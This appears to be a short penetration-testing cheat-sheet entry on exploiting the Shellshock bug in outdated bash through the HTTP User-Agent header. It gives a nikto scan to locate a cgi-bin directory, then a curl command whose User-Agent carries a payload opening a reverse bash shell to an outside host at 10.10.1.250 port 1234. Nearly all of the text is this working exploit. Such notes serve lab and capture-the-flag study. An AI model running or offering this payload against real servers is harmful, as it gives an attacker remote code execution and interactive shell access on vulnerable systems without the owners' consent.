### User-Agent
First you need to find a cgi-bin directory, for this task the best tool is nikto:
```bash
nikto -h <IP>
```

Next with curl we can abuse of the legacy version of outdated bash which accepts some payloads:
```bash
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.1.250/1234 0>&1" http://10.0.30.121/cgi-bin/uptime
```
